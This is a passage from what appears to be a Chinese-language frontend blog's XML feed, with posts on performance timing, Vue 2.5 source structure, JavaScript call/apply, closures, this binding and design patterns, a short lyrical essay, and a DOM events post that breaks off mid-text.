src="http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"&gt; &lt;img src="http://static.oschina.net/uploads/space/2016/0623/152644_6UUC_1177792.png"&gt; &lt;/body&gt;&lt;/html&gt; 2.3统计用户可操作 用户可操作为所有DOM都解析完毕的时间，默认可以统计domready时间，因为通常会在这时候绑定事件操作。对于使用了模块化异步加载的 JS 可以在代码中去主动标记重要 JS 的加载时间，这也是产品指标的统计方式。 使用jquery中的$(document).ready()即是此意义 window.performance.timing.domInteractive window.performance.timing.domContentLoadedEventStart 计算公式：1performance.timing.domInteractive - performance.timing.navigationStart 2.4总下载时间默认可以统计onload时间，这样可以统计同步加载的资源全部加载完的耗时。如果页面中存在很多异步渲染，可以将异步渲染全部完成的时间作为总下载时间。 计算公式：1performance.timing.loadEventStart- performance.timing.navigationStart]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>白屏</tag>
        <tag>首屏</tag>
        <tag>可操，onload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue_vue源码分析_原型&全局API]]></title>
    <url>%2F2018%2F05%2F10%2FVue_vue%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%26API%2F</url>
    <content type="text"><![CDATA[前端架构之路，好胆你就来。看过很多关于Vue源码的文章，觉得自己技术栈很重要的一环就是Vue，所以就想自己也写一篇关于Vue源码的文章。这是我关于Vue源码分析的第一篇文章，主要是讲的是构造函数Vue原型上的方法，全局API。并不涉及编译过程、数据绑定、路由实现、store数据仓库等每个细节的具体实现，具体实现细节后边的文章中会陆续涉及。本文章讲解的源码是基于Vue 2.5.13的。因为自己的业务线需要使用Vue.compiler，并且我做的项目是web客户端渲染，所以这里只讲解with-compiler的版本。 了解一项工程首先要从目录结构以及入口文件开始了解。就像你了解一个姑娘，应该以她为中心辐射她的社交圈一样。 入口文件Vue的源码是一个标准的npm工程目录结构，目录结构如下123456789101112131415161718192021222324252627├── dist ---------------------------------- 构建后文件的输出目录├── examples ------------------------------ 存放一些使用Vue开发的应用案例├── flow ---------------------------------- 类型声明，使用开源项目 [Flow](https://flowtype.org/)├── test ---------------------------------- 包含所有测试文件├── scripts ------------------------------- 构建相关的文件，一般情况下我们不需要动├── src ----------------------------------- 这个是我们最应该关注的目录，包含了源码│ ├── compiler -------------------------- 编译器代码的存放目录，将 template 编译为 render 函数│ │ ├── codegen ----------------------- 存放从抽象语法树(AST)生成render函数的代码│ │ ├── directives -------------------- 存放处理指令的相关代码│ │ ├── parser ------------------------ 存放将模板字符串转换成元素抽象语法树的代码│ │ ├── optimizer.js ------------------ 分析静态树，优化vdom渲染│ ├── core ------------------------------ 存放通用的，平台无关的代码│ │ ├── components -------------------- 包含抽象出来的通用组件│ │ ├── global-api -------------------- 包含给Vue构造函数挂载全局方法(静态方法)或属性的代码│ │ ├── instance ---------------------- 包含Vue构造函数设计相关的代码│ │ ├── observer ---------------------- 反应系统，包含数据观测的核心代码│ │ ├── util -------------------------- 包含核心代码的一些常用工具和配置【策略打表】│ │ ├── vdom -------------------------- 包含虚拟DOM创建(creation)和打补丁(patching)的代码│ ├── platforms ------------------------- 包含平台特有的相关代码以及不同的构建的或包的入口文件│ │ ├── entry-compiler.js ------------- vue-template-compiler 包的入口文件│ │ ├── entry-runtime.js -------------- 运行时构建的入口，输出 dist/vue.common.js 文件，不包含模板(template)到render函数的编译器，所以不支持 `template` 选项，我们使用vue默认导出的就是这个运行时的版本。大家使用的时候要注意│ │ ├── entry-runtime-with-compiler.js 独立构建版本的入口，输出 dist/vue.js，它包含模板(template)到render函数的编译器│ │ ├── entry-server-renderer.js ------ vue-server-renderer 包的入口文件│ ├── server ---------------------------- 包含服务端渲染(server-side rendering)的相关代码│ ├── sfc ------------------------------- 包含单文件组件(.vue文件)的解析逻辑，用于vue-template-compiler包│ ├── shared ---------------------------- 包含整个代码库通用的代码├── package.json -------------------------- 不解释 entry-runtime-with-compiler.js我们看到独立构建版本的入口，是entry-runtime-with-compiler.js,所以我们从这个文件入手。12345678910111213141516171819// 引入Vueimport Vue from './runtime/index'import &#123; compileToFunctions &#125; from './compiler/index'// 缓存原有原型上的方法$mountconst mount = Vue.prototype.$mount// 替换原型方法$mountVue.prototype.$mount = function ( el?: string | Element, hydrating?: boolean): Component &#123;&#125;// 挂在全局方法compileVue.compile = compileToFunctionsexport default Vue 1、我们看到这个入口文件重载了原型上的$mount方法 2、在Vue上挂载了全局方法compile 3、Vue是从/src/platforms/web/runtime/index.js引入的，我们查看这个文件 /src/platforms/web/runtime/index.js123456789101112131415161718192021222324import Vue from 'core/index'Vue.config.mustUseProp = mustUsePropVue.config.isReservedTag = isReservedTagVue.config.isReservedAttr = isReservedAttrVue.config.getTagNamespace = getTagNamespaceVue.config.isUnknownElement = isUnknownElementextend(Vue.options.directives, platformDirectives)extend(Vue.options.components, platformComponents)// 安装原型方法__patch__ [带下划线代表内部使用]Vue.prototype.__patch__ = inBrowser ? patch : noop// 安装原型上的$mount方法Vue.prototype.$mount = function ( el?: string | Element, hydrating?: boolean): Component &#123; el = el &amp;&amp; inBrowser ? query(el) : undefined return mountComponent(this, el, hydrating)&#125;export default Vue 1、我们看到这个文件主要是安装了原型方法$mount 2、设置了全局属性Vue.config 3、Vue是从/src/core/index.js引入的，我们查看这个文件 /src/core/index.js123456789101112131415161718192021222324252627import Vue from './instance/index'import &#123; initGlobalAPI &#125; from './global-api/index'import &#123; isServerRendering &#125; from 'core/util/env'import &#123; FunctionalRenderContext &#125; from 'core/vdom/create-functional-component'// 挂在全局APIinitGlobalAPI(Vue)Object.defineProperty(Vue.prototype, '$isServer', &#123; get: isServerRendering&#125;)Object.defineProperty(Vue.prototype, '$ssrContext', &#123; get () &#123; /* istanbul ignore next */ return this.$vnode &amp;&amp; this.$vnode.ssrContext &#125;&#125;)// expose FunctionalRenderContext for ssr runtime helper installationObject.defineProperty(Vue, 'FunctionalRenderContext', &#123; value: FunctionalRenderContext&#125;)Vue.version = '__VERSION__'export default Vue 1、执行了initGlobalAPI(Vue)，就字面意思而言，应该是初始化了一些全局的API，后边用图示讲解 2、添加原型属性$isServer,$ssrContext 3、添加全局属性FunctionalRenderContext 4、Vue是从/src/core/instance/index.js引入的，我们查看这个文件 /src/core/instance/index.js1234567891011121314151617181920212223242526272829303132import &#123; initMixin &#125; from './init'import &#123; stateMixin &#125; from './state'import &#123; renderMixin &#125; from './render'import &#123; eventsMixin &#125; from './events'import &#123; lifecycleMixin &#125; from './lifecycle'import &#123; warn &#125; from '../util/index'function Vue (options) &#123; if (process.env.NODE_ENV !== 'production' &amp;&amp; !(this instanceof Vue) ) &#123; warn('Vue is a constructor and should be called with the `new` keyword') &#125; this._init(options)&#125;// 安装_initinitMixin(Vue)// 安装$set $delete $watch $data $propsstateMixin(Vue)// 安装$on $once $off $emiteventsMixin(Vue)// 安装_update $forceUpdate $destroylifecycleMixin(Vue)// 安装$nextTick _render 和一堆render相关方法renderMixin(Vue)export default Vue 我们终于看到构造函数Vue的庐山真面目了，众里寻他千百度，蓦然回首。 除了声明了Vue构造函数，这里还分别调用了 initMixin(Vue); stateMixin(Vue); eventsMixin(Vue); lifecycleMixin(Vue); renderMixin(Vue) 他们的作用是向Vue原型上安装方法。具体安装哪些后边用图示说明 值得注意的是，在renderMixin(Vue)中还安装了好几个的原型方法，用于渲染VNode相关操作。 至此，Vue的构造函数创建过程就完成了，用一张图来表示整个Vue的原型方法，全局API的安装过程 经过这一系列的骚操作，Vue就是这个样子了 总结如果你也想写一个大的框架的话，在最新的标准es2015下，你可以借鉴Vue的写法，分层次给构造函数添加原型方法以及全局API。利用策略模式分离可变和不变逻辑。]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[杂文-世界末日]]></title>
    <url>%2F2018%2F05%2F08%2F%E6%9D%82%E6%96%87_%E4%B8%96%E7%95%8C%E6%9C%AB%E6%97%A5%2F</url>
    <content type="text"><![CDATA[但愿绝望和无奈远走高飞坦率讲，还是挺过瘾的，至少感觉自己还可以坚持 想笑来伪装掉下的眼泪 点点头承认自己会怕黑 我只求能借一点的时间来陪 你却连同情都不给 想哭来试探自己麻痹了没 全世界好像只有我疲惫 无所谓反正难过就敷衍走一回 但愿绝望和无奈远走高飞 天灰灰会不会 让我忘了你是谁 夜越黑梦违背 难追难回味 我的世界将被摧毁 也许事与愿违 累不累睡不睡 单影无人相依偎 夜越黑梦违背 有谁肯安慰 我的世界将被摧毁 也许颓废也是另一种美]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>杂文</tag>
        <tag>心情</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA_理解call和apply]]></title>
    <url>%2F2018%2F04%2F19%2FECMA-%E7%90%86%E8%A7%A3call%E5%92%8Capply%2F</url>
    <content type="text"><![CDATA[一：理解call和apply 及arguments.calleeECMAScript3给Function的原型定义了两个方法，他们是Function.prototype.call 和 Function.prototype.apply. 其实他们的作用是一样的，只是传递的参数不一样而已； apply; 接受2个参数，第一个参数指定了函数体内this对象的指向，第二个参数为一个类似数组的集合，比如如下代码： 123456789var yunxi = function(a,b)&#123; console.log([a,b]); // [1,2] console.log(this === window); // true&#125;;yunxi.apply(null,[1,2]); 如上代码，我们第一个参数传入null，函数体内默认会指向与宿主对象，即window对象；因此我们可以在yunxi函数内打印下值为true即可看到： 下面我们来看看使用call方法的实例如下： 123456789var yunxi = function(a,b)&#123; console.log([a,b]); // [1,2] console.log(this === window); // true&#125;;yunxi.call(null,1,2); 可以看到 call方法的第二个参数是以逗号隔开的参数； 那么call和apply用在什么地方呢？ call和apply 最常见的用途是改变函数体内的this指向，如下代码: 12345678910111213var longen = &#123; name:'yunxi'&#125;;var longen2 = &#123; name: '我叫涂根华'&#125;;var name = "我是来测试的";var getName = function()&#123; return this.name;&#125;;console.log(getName()); // 打印 "我是来测试的";console.log(getName.call(longen)); // 打印 yunxiconsole.log(getName.call(longen2)); // 打印 "我叫涂根华" 第一次调用 getName()方法，因为它是普通函数调用，所以它的this指向与window，因此打印出全局对象的name的值； 第二次调用getName.call(longen); 执行这句代码后，getName这个方法的内部指针this指向于longen这个对象了，因此打印this.name实际上是longen.name，因此返回的是name=”yunxi”; 但是this指针也有列外的情况，比如一个点击元素，当我们点击一个元素的时候，this指针就指向与那个点击元素，但是当我们在内部再包含一个函数后，在函数内再继续调用this的话，那么现在的this指针就指向了window了；比如如下代码： 1234567document.getElementById("longen").onclick = function()&#123; console.log(this); // this 就指向于div元素对象了 var func = function()&#123; console.log(this); // 打印出window对象 &#125; func();&#125; 如上代码。可以看到外部this指向与被点击的那个元素，内部普通函数调用，this指针都是指向于window对象。但是我们可以使用call或者apply方法来改变this的指针的；如下代码： 1234567document.getElementById("longen").onclick = function()&#123; console.log(this); // this 就指向于div元素对象了 var func = function()&#123; console.log(this); // 就指向于div元素对象了 &#125; func.call(this);&#125; 如上代码我们使用call方法调用func函数，使this指向与func这个对象了，当然上面的方法我们还可以不使用call或者apply方法来改变this的指针，我们可以在外部先使用一个变量来保存this的指针，在内部调用的时候我们可以使用哪个变量即可，如下代码演示： 12345678document.getElementById("longen").onclick = function()&#123; console.log(this); // this 就指向于div元素对象了 var self = this; var func = function()&#123; console.log(self); // 就指向于div元素对象了 &#125; func();&#125; arguments.callee的理解callee是arguments的一个属性，它可以被用作当前函数或函数体执行的环境中，或者说调用一个匿名函数；返回的是当前正在被执行的Function对象；简单的来说就是当前执行环境的函数被调用时候，arguments.callee对象会指向与自身，就是当前的那个函数的引用； 如下代码： 12345678910var count = 1;var test = function() &#123; console.log(count + " -- " + (test.length == arguments.callee.length) ); // 打印出 1 -- true 2 -- true 3 -- true if (count++ &lt; 3) &#123; // 调用test()函数自身 arguments.callee(); &#125;&#125;;test(); arguments.callee()的含义是调用当前正在执行的函数自身，比如上面的test的匿名函数； Function.prototype.bind介绍目前很多高级浏览器都支持Function.prototype.bind方法，该方法用来指定函数内部的this指向。为了支持各个浏览器，我们也可以自己来简单的模拟一个~ 如下代码： 123456789101112131415Function.prototype.bind = function(context) &#123; var self = this; return function()&#123; return self.apply(context,arguments); &#125;&#125;var yunxi = &#123; name: 'yunxi'&#125;;var func = function()&#123; console.log(this.name); // yunxi&#125;.bind(yunxi);func(); 如上代码所示：func这个函数使用调用bind这个方法，并且把对象yunxi作为参数传进去，然后bind函数使用return返回一个函数，当我们调用func()执行这个方法的时候，其实我们就是在调用bind方法内的return返回的那个函数，在返回的那个函数内context的上下文其实就是我们以参数yunxi对象传进去的，因此this指针指向与yunxi这个对象了~ 所以打印出this.name 就是yunxi那个对象的name了; 除了上面我们看到的介绍apply或者call方法可以改变this指针外，我们还可以使用call或者apply来继承对象的方法；实质也就是改变this的指针了； 比如有如下代码： 1234567891011121314var Yunxi = function(name)&#123; this.name = name;&#125;;var Longen = function()&#123; Yunxi.apply(this,arguments);&#125;;Longen.prototype.getName = function()&#123; return this.name;&#125;;var longen = new Longen("tugenhua");console.log(longen.getName()); // 打印出tugenhua 如上代码：我先实例化Longen这个对象，把参数传进去，之后使用Yunxi.apply(this,arguments)这句代码来改变Longen这个对象的this的指针，使他指向了Yunxi这个对象，因此Yunxi这个对象保存了longen这个实例化对象的参数tugenhua，因此当我们调用longen.getName这个方法的时候，我们返回this.name，即我们可以认为返回的是 Yunxi.name 因此返回的是 tugenhua，我们只是借用了下Yunxi这个对象内的this.name来保存Longen传进去的参数而已； 二：闭包的理解闭包的结构有如下2个特性 封闭性：外界无法访问闭包内部的数据，如果在闭包内声明变量，外界是无法访问的，除非闭包主动向外界提供访问接口； 持久性：一般的函数，调用完毕之后，系统自动注销函数，而对于闭包来说，在外部函数被调用之后，闭包结构依然保存在 系统中，闭包中的数据依然存在，从而实现对数据的持久使用。 缺点： 使用闭包会占有内存资源，过多的使用闭包会导致内存溢出等. 如下代码： 123456789function a(x) &#123; var a = x; var b = function()&#123; return a; &#125; return b;&#125;var b = a(1);console.log(b()); // 1 首先在a函数内定义了2个变量，1个是存储参数，另外一个是闭包结构，在闭包结构中保存着b函数内的a变量，默认情况下，当a函数调用完之后a变量会自动销毁的，但是由于闭包的影响，闭包中使用了外界的变量，因此a变量会一直保存在内存当中，因此变量a参数没有随着a函数销毁而被释放，因此引申出闭包的缺点是：过多的使用闭包会占有内存资源，或内存溢出等肯能性； 1234567891011// 经典的闭包实列如下：function f(x)&#123; //外部函数 var a = x; // 外部函数的局部变量，并传递参数 var b = function()&#123; // 内部函数 return a; // 访问外部函数中的局部变量 &#125;; a++; // 访问后，动态更新外部函数的变量 return b; // 返回内部函数&#125;var c = f(5); // 调用外部函数并且赋值console.log(c()); // 调用内部函数，返回外部函数更新后的值为6 下面我们来看看如下使用闭包的列子 在如下代码中有2个函数，f函数的功能是：把数组类型的参数中每个元素的值分别封装在闭包结构中，然后把闭包存储在一个数组中，并返回这个数组，但是在函数e中调用函数f并向其传递一个数组[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;],然后遍历返回函数f返回数组，我们运行打印后发现都是c undefined，那是因为在执行f函数中的循环时候，把值虽然保存在temp中，但是每次循环后temp值在不断的变化，当for循环结束后，此时temp值为c，同时i变为3，因此当调用的时候 打印出来的是temp为3，arrs[3]变为undefined；因此打印出 c undefined 解决闭包的缺陷我们可以再在外面包一层函数，每次循环的时候，把temp参数和i参数传递进去 如代码二 1234567891011121314151617181920212223242526272829303132333435363738// 代码一function f(x) &#123; var arrs = []; for(var i = 0; i &lt; x.length; i++) &#123; var temp = x[i]; arrs.push(function()&#123; console.log(temp + ' ' +x[i]); // c undefined &#125;); &#125; return arrs;&#125;function e()&#123; var ar = f(["a","b","c"]); for(var i = 0,ilen = ar.length; i &lt; ilen; i++) &#123; ar[i](); &#125;&#125;e();// 代码二：function f2(x) &#123; var arrs = []; for(var i = 0; i &lt; x.length; i++) &#123; var temp = x[i]; (function(temp,i)&#123; arrs.push(function()&#123; console.log(temp + ' ' +x[i]); // c undefined &#125;); &#125;)(temp,i); &#125; return arrs;&#125;function e2()&#123; var ar = f2(["a","b","c"]); for(var i = 0,ilen = ar.length; i &lt; ilen; i++) &#123; ar[i](); &#125;&#125;e2(); 三：javascript中的this详解this的指向常见的有如下几点需要常用到： 全局对象的this是指向与window； 作为普通函数调用。 作为对象方法调用。 构造器调用。 Function.prototype.call 或 Function.prototype.apply调用。 下面我们分别来介绍一下： 1. 全局对象的this；123456789console.log(this); // this指向于windowsetTimeout() 和 setInterval()函数内部的this指针是指向于window的，如下代码： function test()&#123; console.log(11); &#125; setTimeout(function()&#123; console.log(this === window); // true this.test(); // 11 &#125;); 2. 作为普通函数调用；12345var name = "longen";function test()&#123; return this.name;&#125;console.log(test()); // longen 当作为普通函数调用时候，this总是指向了全局对象，在浏览器当中，全局对象一般指的是window； 3. 作为对象的方法调用。如下代码： 12345678var obj = &#123; "name": "我的花名改为云溪了，就是为了好玩", getName: function()&#123; console.log(this); // 在这里this指向于obj对象了 console.log(this.name); // 打印 我的花名改为云溪了，就是为了好玩 &#125;&#125;;obj.getName(); // 对象方法调用 但是呢，我们不能像如下一样调用对象了，如下调用对象的话，this还是执行了window，如下代码： 12345678910var name = "全局对象名字";var obj = &#123; "name": "我的花名改为云溪了，就是为了好玩", getName: function()&#123; console.log(this); // window console.log(this.name); // 全局对象名字 &#125;&#125;;var yunxi = obj.getName;yunxi(); 运行yunxi()函数，还是会像调用普通函数一样，this指向了window的； 4. 构造器调用。Javascript中不像Java一样，有类的概念，而JS中只能通过构造器创建对象，通过new 对象，当new运算符调用函数时候，该函数会返回一个对象，一般情况下，构造器里面的this就是指向返回的这个对象； 如下代码： 12345var Obj = function()&#123; this.name = "yunxi";&#125;;var test = new Obj();console.log(test.name); // yunxi 注意：构造器函数第一个字母需要大写，这是为了区分普通函数还是构造器函数而言； 如上代码：通过调用 new Obj()方法 返回值保存到test变量中，那么test就是那个对象了，所以内部的this就指向与test对象了，因此test.name就引用到了内部的this.name 即输出 “yunxi”字符串； 但是也有例外的情况，比如构造器显示地返回了一个对象的话，那么这次继续调用的话，那么会最终会返回这个对象，比如如下代码： 12345678var obj = function()&#123; this.name = "yunxi"; return &#123; "age": "27" &#125;&#125;;var test = new obj();console.log(test.name); // undefined 那么继续调用的话，会返回unedfined，因为返回的是那个对象，对象里面没有name这个属性，因此值为undefined； 四：理解函数引用和函数调用的区别看下面的代码分析: 12345678910111213141516171819202122232425262728// 函数引用 代码一function f()&#123; var x = 5; return x;&#125;var a = f;var b = f;console.log(a===b); // true// 函数调用 代码二function f2() &#123; var x = 5; return x;&#125;var a2 = f2();var b2 = f2();console.log(a2 === b2);// 函数调用 代码三function f3()&#123; var x = 5; return function()&#123; return x; &#125;&#125;var a3 = f3();var b3 = f3();console.log(a3 === b3); // false 如上的代码：代码一和代码二分部是函数引用和函数调用的列子，返回都为true，代码三也是函数调用的列子，返回且为false 我们现在来理解下函数引用和函数调用的本质区别：当引用函数时候，多个变量内存存储的是函数的相同的入口指针，因此对于同一个函数来讲，无论多少个变量引用，他们都是相等的，因为对于引用类型(对象，数组，函数等)都是比较的是内存地址，如果他们内存地址一样的话，说明是相同的；但是对于函数调用来讲，比如代码三;每次调用的时候，都被分配一个新的内存地址，所以他们的内存地址不相同，因此他们会返回false，但是对于代码二来讲，我们看到他们没有返回函数，只是返回数值，他们比较的不是内存地址，而是比较值，所以他们的值相等，因此他们也返回true，我们也可以看看如下实列化一个对象的列子，他们也被分配到不同的内存地址，因此他们也是返回false的；如下代码测试： 123456function F()&#123; this.x = 5;&#125;var a = new F();var b = new F();console.log(a === b); // false 五：理解js中的链式调用我们使用jquery的时候，jquery的简单的语法及可实现链式调用方法，现在我们自己也封装一个链式调用的方法，来理解下 jquery中如何封装链式调用 无非就是每次调用一个方法的时候 给这个方法返回this即可，this指向该对象自身，我们看看代码： 123456789101112131415161718192021222324252627282930313233// 定义一个简单的对象，每次调用对象的方法的时候，该方法都返回该对象自身var obj = &#123; a: function()&#123; console.log("输出a"); return this; &#125;, b:function()&#123; console.log("输出b"); return this; &#125;&#125;;console.log(obj.a().b()); // 输出a 输出b 输出this指向与obj这个对象// 下面我们再看下 上面的通过Function扩展类型添加方法的demo如下：Function.prototype.method = function(name,func) &#123; if(!this.prototype[name]) &#123; this.prototype[name] = func; return this; &#125;&#125;String.method('trim',function()&#123; return this.replace(/^\s+|\s+$/g,'');&#125;);String.method('log2',function()&#123; console.log("链式调用"); return this;&#125;);String.method('r',function()&#123; return this.replace(/a/,'');&#125;);var str = " abc ";console.log(str.trim().log2().r()); // 输出链式调用和 bc 六：理解使用函数实现历史记录–提高性能函数可以使用对象去记住先前操作的结果，从而避免多余的运算。比如我们现在测试一个费波纳茨的算法，我们可以使用递归函数计算fibonacci数列，一个fibonacci数字是之前两个fibonacci数字之和，最前面的两个数字是0和1；代码如下： 123456789var count = 0; var fibonacci = function(n) &#123; count++; return n &lt; 2 ? n : fibonacci(n-1) + fibonacci(n-2); &#125;; for(var i = 0; i &lt;= 10; i+=1) &#123; console.log(i+":"+fibonacci(i)); &#125; console.log(count); // 453 我们可以看到如上 fibonacci函数总共调用了453次，for循环了11次，它自身调用了442次，如果我们使用下面的记忆函数的话，那么就可以减少他们的运算次数，从而提高性能； 思路：先使用一个临时数组保存存储结果，当函数被调用的时候，先看是否已经有存储结果 如果有的话，就立即返回这个存储结果，否则的话，调用函数运算下；代码如下： 123456789101112131415161718var count2 = 0;var fibonacci2 = (function()&#123; var memo = [0,1]; var fib = function(n) &#123; var result = memo[n]; count2++; if(typeof result !== 'number') &#123; result = fib(n-1) + fib(n-2); memo[n] = result; &#125; return result; &#125;; return fib; &#125;)(); for(var j = 0; j &lt;= 10; j+=1) &#123; console.log(j+":"+fibonacci2(j)); &#125; console.log(count2); // 29 这个函数也返回了同样的结果，但是只调用了函数29次，循环了11次，也就是说函数自身调用了18次，从而减少无谓的函数的调用及运算，下面我们可以把这个函数进行抽象化，以构造带记忆功能的函数，如下代码： 123456789101112131415161718192021var count3 = 0;var memoizer = function(memo,formula) &#123; var recur = function(n) &#123; var result = memo[n]; count3++; // 这句代码只是说明运行函数多少次，在代码中并无作用，实际使用上可以删掉 if(typeof result !== 'number') &#123; result = formula(recur,n); memo[n] = result; &#125; return result; &#125;; return recur; &#125;; var fibonacci3 = memoizer([0,1],function(recur,n)&#123; return recur(n-1) + recur(n-2); &#125;); // 调用方式如下 for(var k = 0; k &lt;=10; k+=1) &#123; console.log(k+":"+fibonacci3(k)); &#125; console.log(count3); // 29 如上封装 memoizer 里面的参数是实现某个方法的计算公式，具体的可以根据需要自己手动更改，这边的思路无非就是想习惯使用对象去保存临时值，从而减少不必要的取值存储值的操作； 七：理解通过Function扩展类型javascript 允许为语言的基本数据类型定义方法。通过Object.prototype添加原型方法，该方法可被所有的对象使用。 这对函数，字符串，数字，正则和布尔值都适用，比如如下现在给Function.prototype增加方法，使该方法对所有函数都可用，代码如下： 123456789101112131415Function.prototype.method = function(name,func) &#123; if(!this.prototype[name]) &#123; this.prototype[name] = func; return this; &#125;&#125;Number.method('integer',function()&#123; return Math[this &lt; 0 ? 'ceil' : 'floor'](this);&#125;);console.log((-10/3).integer()); // -3String.method('trim',function()&#123; return this.replace(/^\s+|\s+$/g,'');&#125;);console.log(" abc ".trim()); // abc 八：理解使用模块模式编写代码使用函数和闭包可以构建模块，所谓模块，就是一个提供接口却隐藏状态与实现的函数或对象。使用函数构建模块的优点是：减少全局变量的使用； 比如如下：我想为String扩展一个方法，该方法的作用是寻找字符串中的HTML字符字体并将其替换为对应的字符； 123456789101112131415161718192021// 如下代码：Function.prototype.method = function(name,func) &#123; if(!this.prototype[name]) &#123; this.prototype[name] = func; return this; &#125;&#125;String.method('deentityify',function()&#123; var entity = &#123; quot: '"', It: '&lt;', gt: '&gt;' &#125;; return function()&#123; return this.replace(/&amp;([^&amp;;]+);/g,function(a,b)&#123; var r = entity[b]; return typeof r === 'string' ? r : a; &#125;); &#125;&#125;());console.log("&amp;It;&amp;quot;&amp;gt;".deentityify()); // &lt;"&gt; 模块模式利用函数作用域和闭包来创建绑定对象与私有成员的关联，比如在上面的deentityify()方法才有权访问字符实体表entity这个数据对象； 模块开发的一般形式是：定义了私有变量和函数的函数，利用闭包创建可以访问到的私有变量和函数的特权函数，最后返回这个特权函数，或把他们保存到可以访问的地方。 模块模式一般会结合实例模式使用。javascript的实例就是使用对象字面量表示法创建的。对象的属性值可以是数值或者函数，并且属性值在该对象的生命周期中不会发生变化；比如如下代码属于模块模式：定义了一个私有变量name属性，和一个实例模式(对象字面量obj)并且返回这个对象字面量obj，对象字面量中的方法与私有变量name进行了绑定； 123456789101112131415// 比如如下经典的模块模式var MODULE = (function()&#123; var name = "tugenhua"; var obj = &#123; setName: function() &#123; this.name = name; &#125;, getName: function()&#123; return this.name; &#125; &#125;; return obj;&#125;)();MODULE.setName()console.log(MODULE.getName()); // tugenhua 九：理解惰性实列化在页面中javascript初始化执行的时候就实例化类，如果在页面中没有使用这个实列化的对象，就会造成一定的内存浪费和性能损耗；这时候，我们可以使用惰性实列化来解决这个问题，惰性就是把实列化推迟到需要使用它的时候才去做，做到 “按需供应”; 12345678910111213141516171819202122232425262728293031323334353637383940414243// 惰性实列化代码如下var myNamespace = function()&#123; var Configure = function()&#123; var privateName = "tugenhua"; var privateGetName = function()&#123; return privateName; &#125;; var privateSetName = function(name) &#123; privateName = name; &#125;; // 返回单列对象 return &#123; setName: function(name) &#123; privateSetName(name); &#125;, getName: function()&#123; return privateGetName(); &#125; &#125; &#125;; // 存储Configure实列 var instance; return &#123; init: function()&#123; // 如果不存在实列，就创建单列实列 if(!instance) &#123; instance = Configure(); &#125; // 创建Configure单列 for(var key in instance) &#123; if(instance.hasOwnProperty(key)) &#123; this[key] = instance[key]; &#125; &#125; this.init = null; return this; &#125; &#125;&#125;();// 调用方式myNamespace.init();var name = myNamespace.getName();console.log(name); // tugenhua 如上代码是惰性化实列代码：它包括一个单体Configure实列，直接返回init函数，先判断该单体是否被实列化，如果没有被实列化的话，则创建并执行实列化并返回该实列化，如果已经实列化了，则返回现有实列；执行完后，则销毁init方法，只初始化一次 十：惰性载入函数（也是解决兼容问题的）和上面分支的原理是一样的，代码也可以按照上面的推荐分支风格编码的；解决的问题也是解决多个if条件判断的；代码如下： 123456789// 代码如下：var addEvent = function(el,type,handler)&#123; addEvent = el.addEventListener ? function(el,type,handler)&#123; el.addEventListener(type,handler,false); &#125; : function(el,type,handler) &#123; el.attachEvent("on" + type,handler); &#125; addEvent(el,type,handler);&#125;; 惰性载入函数也是在函数内部改变自身的一种方式，在重复执行的时候就不会再进行检测的；惰性载入函数的分支只会执行一次，即第一次调用的时候，其优点如下： 要执行的适当代码只有在实际调用函数时才执行。 第一次调用该函数的时候，紧接着内部函数也会执行，但是正因为这个，所以后续继续调用该函数的话，后续的调用速度会很快；因此避免了多重条件； 十一：理解函数节流DOM操作的交互需要更多的内存和CPU时间，连续进行过多的DOM相关的操作可能会导致浏览器变慢甚至崩溃，函数节流的设计思想是让某些代码可以在间断的情况下连续重复执行，实现该方法可以使用定时器对该函数进行节流操作; 比如：第一次调用函数的时候，创建一个定时器，在指定的时间间隔下执行代码。当第二次执行的时候，清除前一次的定时器并设置另一个，将其替换成一个新的定时器; 1234567891011// 如下简单函数节流代码演示function throttle(method, context) &#123; clearTimeout(method.tId); method.tId = setTimeout(function () &#123; method.call(context); &#125;,500);&#125;// 执行操作window.onresize = function () &#123; throttle(handle, window);&#125; 函数节流解决的问题是一些代码(比如事件)无间断的执行，这可能会影响浏览器的性能，比如浏览器变慢或者直接崩溃。比如对于mouseover事件或者click事件，比如点击tab项菜单，无限的点击，有可能会导致浏览器会变慢操作，这时候我们可以使用函数节流的操作来解决；]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>call</tag>
        <tag>apply</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA_DOM事件]]></title>
    <url>%2F2018%2F04%2F19%2FECMA-DOM%E4%BA%8B%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[一、绑定事件的方法HTML内联属性绑定1&lt;div onclick="alert('fuck')"&gt;&lt;/div&gt; js获取DOM元素添加事件属性1document.getElementById('box').onclick = function ()&#123;...&#125; 使用 addEventListener()第一种方法，HTML内联属性绑定事件的方式不推荐，这违反了最佳实践。第二种方法的缺点是，只能同时给事件绑定一个callback，所以推荐一直使用 addEventListener() 方法给元素绑定事件 如果要移除一个通过 addEventListener 添加的事件处理函数，那么给 removeEventListener 传递的两个参数必须与 addEventListener 的前两个参数完全相同。这意味着，给一个元素绑定匿名事件处理函数将无法被移除 二、事件流事件流页面中接收事件的顺序。分为三个阶段：事件捕获阶段、处于目标阶段、事件冒泡阶段 事件冒泡事件首先由嵌套层次最深的节点接收，然后沿DOM树依次逐级向父代节点传播。 事件捕获不太具体的节点(或嵌套层次最浅的节点，通常是document)应该最先接收事件，然后沿DOM树依次向子代节点传递直到一个具体的子节点 三、绑定事件的方法标准方法el.addEventListener(eventName, handle, useCapture) 描述：给DOM元素添加指定的事件处理函数 参数： {String} eventName 事件名称 {Function} handle 事件函数 {Boolean} useCapture 是否在事件捕获阶段触发事件，true 代表捕获阶段触发，false 代表在冒泡阶段触发 el.removeEventListener(eventName, handle) 描述：移除通过 addEventListener 添加的事件处理函数 参数： {String} eventName 事件名称 {Function} handle 事件函数 如果要移除一个通过 addEventListener 添加的事件处理函数，那么给 removeEventListener 传递的两个参数必须与 addEventListener 